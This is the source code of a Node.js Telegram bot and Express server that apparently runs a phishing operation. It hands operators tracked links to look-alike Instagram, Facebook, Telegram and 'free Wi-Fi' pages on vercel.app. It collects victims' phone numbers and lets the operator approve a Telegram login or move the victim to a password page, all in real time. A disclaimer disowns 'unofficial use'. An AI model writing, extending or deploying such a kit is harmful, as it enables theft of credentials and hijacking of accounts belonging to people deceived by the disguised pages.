const { TelegramBot } = require("node-telegram-bot-api");
const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const crypto = require("crypto");

// ============================================================
// الإعدادات
// ============================================================

const TOKEN = process.env.BOT_TOKEN;
const PORT = process.env.PORT || 3000;

if (!TOKEN) {
    console.error("❌ BOT_TOKEN is missing");
    process.exit(1);
}


// ============================================================
// Telegram Bot
// ============================================================

const bot = new TelegramBot(TOKEN, {
    polling: true
});

console.log("✅ Telegram Bot started");


// ============================================================
// Express
// ============================================================

const app = express();

app.use(express.json());


// ============================================================
// CORS
// ============================================================

app.use((req, res, next) => {

    res.setHeader(
        "Access-Control-Allow-Origin",
        "*"
    );

    res.setHeader(
        "Access-Control-Allow-Methods",
        "GET,POST,OPTIONS"
    );

    res.setHeader(
        "Access-Control-Allow-Headers",
        "Content-Type"
    );

    if (req.method === "OPTIONS") {
        return res.sendStatus(204);
    }

    next();
});


// ============================================================
// Database
// ============================================================

const db = new sqlite3.Database("./referrals.db");

db.serialize(() => {

    db.run(`
        CREATE TABLE IF NOT EXISTS referrals (
            token TEXT PRIMARY KEY,
            telegram_id TEXT NOT NULL,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

    db.run(`
        CREATE TABLE IF NOT EXISTS contact_requests (
            request_id TEXT PRIMARY KEY,
            telegram_id TEXT NOT NULL,
            phone TEXT NOT NULL,
            status TEXT NOT NULL DEFAULT 'pending',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    `);

});

console.log("✅ Database ready");


// ============================================================
// المستخدمون الذين وافقوا على الشروط
// ============================================================

const acceptedUsers = new Set();


// ============================================================
// Helpers
// ============================================================

function createToken() {

    return crypto
        .randomBytes(32)
        .toString("hex");

}


function createRequestId() {

    return crypto
        .randomBytes(16)
        .toString("hex");

}


function createReferral(telegramId) {

    return new Promise((resolve, reject) => {

        const token = createToken();

        db.run(
            `
            INSERT INTO referrals
            (token, telegram_id)
            VALUES (?, ?)
            `,
            [
                token,
                String(telegramId)
            ],
            (error) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(token);

            }
        );

    });

}


function getReferral(token) {

    return new Promise((resolve, reject) => {

        db.get(
            `
            SELECT *
            FROM referrals
            WHERE token = ?
            `,
            [token],
            (error, row) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(row || null);

            }
        );

    });

}


function getRequest(requestId) {

    return new Promise((resolve, reject) => {

        db.get(
            `
            SELECT *
            FROM contact_requests
            WHERE request_id = ?
            `,
            [requestId],
            (error, row) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve(row || null);

            }
        );

    });

}


function updateRequestStatus(
    requestId,
    status
) {

    return new Promise((resolve, reject) => {

        db.run(
            `
            UPDATE contact_requests
            SET status = ?
            WHERE request_id = ?
            `,
            [
                status,
                requestId
            ],
            (error) => {

                if (error) {
                    reject(error);
                    return;
                }

                resolve();

            }
        );

    });

}


// ============================================================
// Health
// ============================================================

app.get("/", (req, res) => {

    res.json({
        ok: true,
        service: "Telegram Contact Server"
    });

});


app.get("/health", (req, res) => {

    res.json({
        ok: true,
        status: "online"
    });

});


// ============================================================
// إنشاء Referral
// ============================================================

app.post(
    "/api/referral/create",
    async (req, res) => {

        try {

            const {
                telegram_id
            } = req.body;

            if (!telegram_id) {

                return res.status(400).json({
                    success: false,
                    error: "telegram_id is required"
                });

            }

            const token =
                await createReferral(
                    telegram_id
                );

            res.json({
                success: true,
                token
            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                error: "Failed to create referral"
            });

        }

    }
);


// ============================================================
// التحقق من Referral
// ============================================================

app.get(
    "/api/referral/:token",
    async (req, res) => {

        try {

            const referral =
                await getReferral(
                    req.params.token
                );

            if (!referral) {

                return res.status(404).json({
                    success: false,
                    valid: false,
                    error: "Invalid referral"
                });

            }

            res.json({
                success: true,
                valid: true
            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                error: "Database error"
            });

        }

    }
);


// ============================================================
// طلب تواصل - مع 3 أزرار ✅
// ============================================================

app.post(
    "/api/request-access",
    async (req, res) => {

        try {

            const {
                ref,
                phone
            } = req.body;


            if (!ref) {

                return res.status(400).json({
                    success: false,
                    error: "ref is required"
                });

            }


            if (!phone) {

                return res.status(400).json({
                    success: false,
                    error: "phone is required"
                });

            }


            const referral =
                await getReferral(ref);


            if (!referral) {

                return res.status(404).json({
                    success: false,
                    error: "Invalid referral"
                });

            }


            const telegramId =
                referral.telegram_id;


            const requestId =
                createRequestId();


            await new Promise(
                (resolve, reject) => {

                    db.run(
                        `
                        INSERT INTO contact_requests
                        (
                            request_id,
                            telegram_id,
                            phone,
                            status
                        )
                        VALUES (?, ?, ?, ?)
                        `,
                        [
                            requestId,
                            String(telegramId),
                            String(phone),
                            "pending"
                        ],
                        (error) => {

                            if (error) {
                                reject(error);
                                return;
                            }

                            resolve();

                        }
                    );

                }
            );


            // ✅ إرسال رسالة مع 3 أزرار
            await bot.sendMessage(

                telegramId,

`📩 طلب تواصل جديد

📱 رقم التواصل:
${phone}

🆔 رقم الطلب:
${requestId}

اختر الإجراء:`,

                {
                    reply_markup: {

                        inline_keyboard: [

                            [
                                {
                                    text: "❌ رفض",
                                    callback_data:
                                        `reject:${requestId}`
                                }
                            ],

                            [
                                {
                                    text: "✅ السماح بالدخول",
                                    callback_data:
                                        `approve_telegram:${requestId}`
                                }
                            ],

                            [
                                {
                                    text: "🔑 الانتقال للصفحة الثالثة",
                                    callback_data:
                                        `third_page:${requestId}`
                                }
                            ]

                        ]

                    }

                }

            );


            res.json({

                success: true,
                requestId

            });

        } catch (error) {

            console.error(
                "❌ Request error:",
                error
            );

            res.status(500).json({

                success: false,
                error:
                    "Failed to create request"

            });

        }

    }
);


// ============================================================
// فحص الطلب
// ============================================================

app.get(
    "/api/check-request/:requestId",
    async (req, res) => {

        try {

            const request =
                await getRequest(
                    req.params.requestId
                );


            if (!request) {

                return res.status(404).json({
                    success: false,
                    error: "Request not found"
                });

            }


            res.json({

                success: true,

                status:
                    request.status

            });

        } catch (error) {

            console.error(error);

            res.status(500).json({
                success: false,
                error: "Database error"
            });

        }

    }
);


// ============================================================
// Forgot Password
// ============================================================

app.post(
    "/forgot-password",
    async (req, res) => {

        try {

            const { ref } = req.body;

            if (!ref) {
                return res.status(400).json({
                    success: false,
                    error: "ref is required"
                });
            }

            const referral = await getReferral(ref);

            if (!referral) {
                return res.status(404).json({
                    success: false,
                    error: "Invalid referral"
                });
            }

            const telegramId = referral.telegram_id;

            await bot.sendMessage(
                telegramId,
                `🔑 طلب إعادة تعيين كلمة المرور

تم إرسال طلب إعادة تعيين كلمة المرور.

يرجى التواصل مع المستخدم لتأكيد الطلب.`
            );

            res.json({
                success: true,
                message: "تم إرسال الطلب"
            });

        } catch (error) {

            console.error(
                "❌ Forgot password error:",
                error
            );

            res.status(500).json({
                success: false,
                error: "Failed to send request"
            });

        }

    }
);


// ============================================================
// القائمة الرئيسية
// ============================================================

function sendMainMenu(chatId) {

    return bot.sendMessage(

        chatId,

        "👋 أهلاً بك\n\nاختر الخدمة:",

        {
            reply_markup: {

                inline_keyboard: [

                    [
                        {
                            text: "📸 Instagram",
                            callback_data: "instagram"
                        },

                        {
                            text: "📘 Facebook",
                            callback_data: "facebook"
                        }
                    ],

                    [
                        {
                            text: "✈️ Telegram",
                            callback_data: "telegram"
                        },

                        {
                            text: "📞 طلب اتصال",
                            callback_data: "contact"
                        }
                    ],

                    [
                        {
                            text: "📶 Wi-Fi",
                            callback_data: "wifi"
                        }

                    ]

                ]

            }

        }

    );

}


// ============================================================
// /start
// ============================================================

bot.onText(
    /^\/start$/,
    async (msg) => {

        try {

            const chatId =
                msg.chat.id;

            const firstName =
                msg.from?.first_name ||
                "غير معروف";

            const lastName =
                msg.from?.last_name ||
                "";

            const username =
                msg.from?.username
                    ? `@${msg.from.username}`
                    : "لا يوجد";

            const fullName =
                `${firstName} ${lastName}`.trim();


            if (
                acceptedUsers.has(chatId)
            ) {

                return sendMainMenu(
                    chatId
                );

            }


            await bot.sendMessage(

                chatId,

`👋 أهلاً بك ${fullName}

🆔 معرف Telegram الخاص بك:
${chatId}

👤 Username:
${username}

📋 شروط استخدام البوت:

أنا غير مسؤول عن أي استخدام غير رسمي للبوت.

باستخدامك للبوت، أنت تقر بأنك قرأت الشروط وتوافق عليها.`,

                {
                    reply_markup: {

                        inline_keyboard: [

                            [
                                {
                                    text:
                                        "✅ أوافق على الشروط",

                                    callback_data:
                                        "accept_terms"
                                }
                            ]

                        ]

                    }

                }

            );

        } catch (error) {

            console.error(
                "❌ Start error:",
                error
            );

        }

    }
);


// ============================================================
// أزرار البوت - مع 3 حالات ✅
// ============================================================

bot.on(
    "callback_query",
    async (query) => {

        try {

            const chatId =
                query.message.chat.id;

            const data =
                query.data;


            // =================================================
            // ❌ رفض
            // =================================================

            if (
                data.startsWith("reject:")
            ) {

                const requestId =
                    data.split(":")[1];


                await updateRequestStatus(
                    requestId,
                    "rejected"
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "❌ تم رفض الطلب"
                    }

                );


                await bot.editMessageText(

                    `❌ تم رفض طلب التواصل`,

                    {
                        chat_id: chatId,
                        message_id:
                            query.message.message_id
                    }

                );


                return;
            }


            // =================================================
            // ✅ السماح بالدخول (رابط Telegram)
            // =================================================

            if (
                data.startsWith("approve_telegram:")
            ) {

                const requestId =
                    data.split(":")[1];


                await updateRequestStatus(
                    requestId,
                    "approved_telegram"
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "✅ تم السماح بالدخول إلى Telegram"
                    }

                );


                await bot.editMessageText(

                    `✅ تم السماح بالدخول إلى Telegram`,

                    {
                        chat_id: chatId,
                        message_id:
                            query.message.message_id
                    }

                );


                return;
            }


            // =================================================
            // 🔑 الانتقال للصفحة الثالثة
            // =================================================

            if (
                data.startsWith("third_page:")
            ) {

                const requestId =
                    data.split(":")[1];


                await updateRequestStatus(
                    requestId,
                    "third_page"
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "🔑 تم الانتقال للصفحة الثالثة"
                    }

                );


                await bot.editMessageText(

                    `🔑 تم الانتقال للصفحة الثالثة (كلمة المرور)`,

                    {
                        chat_id: chatId,
                        message_id:
                            query.message.message_id
                    }

                );


                return;
            }


            // =================================================
            // قبول الشروط
            // =================================================

            if (
                data ===
                "accept_terms"
            ) {

                acceptedUsers.add(
                    chatId
                );


                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "تم قبول الشروط ✅"
                    }

                );


                await bot.sendMessage(

                    chatId,

`✅ تم قبول الشروط.

أهلاً بك ${
    query.from?.first_name || ""
}.

🆔 ID الخاص بك:
${chatId}

اضغط /start للمتابعة.`

                );


                return;

            }


            // =================================================
            // منع القائمة قبل الموافقة
            // =================================================

            if (
                !acceptedUsers.has(chatId)
            ) {

                await bot.answerCallbackQuery(

                    query.id,

                    {
                        text:
                            "يجب الموافقة على الشروط أولاً."
                    }

                );

                return;

            }


            // =================================================
            // الخدمات
            // =================================================

            const websites = {

                instagram:
                    "https://instagram-two-henna.vercel.app/",

                facebook:
                    "https://facebook-ruby-one.vercel.app/",

                telegram:
                    "https://telegram-one-rho.vercel.app/",

                contact:
                    "https://telegram-one-rho.vercel.app/",

                wifi:
                    "https://wifi-free-gamma.vercel.app/"

            };


            const website =
                websites[data];


            if (!website) {

                await bot.answerCallbackQuery(
                    query.id
                );

                return;

            }


            const token =
                await createReferral(
                    chatId
                );


            const separator =
                website.includes("?")
                    ? "&"
                    : "?";


            const referralUrl =
                `${website}${separator}ref=${token}`;


            await bot.answerCallbackQuery(

                query.id,

                {
                    text:
                        "تم إنشاء الرابط ✅"
                }

            );


            await bot.sendMessage(

                chatId,

`🔗 هذا رابطك الخاص:

${referralUrl}

🆔 Chat ID الخاص بك:
${chatId}

يمكنك مشاركة الرابط مع الشخص الذي يريد التواصل معك.`

            );


        } catch (error) {

            console.error(
                "❌ Callback error:",
                error
            );

        }

    }
);


// ============================================================
// Telegram polling errors
// ============================================================

bot.on(
    "polling_error",
    (error) => {

        console.error(
            "❌ Telegram polling error:",
            error.message
        );

    }
);


// ============================================================
// تشغيل السيرفر
// ============================================================

app.listen(

    PORT,

    "0.0.0.0",

    () => {

        console.log("");
        console.log(
            "===================================="
        );

        console.log(
            "🚀 Telegram Bot + API Server"
        );

        console.log(
            `🌐 Port: ${PORT}`
        );

        console.log(
            "❤️ Health: /health"
        );

        console.log(
            "===================================="
        );

    }

);
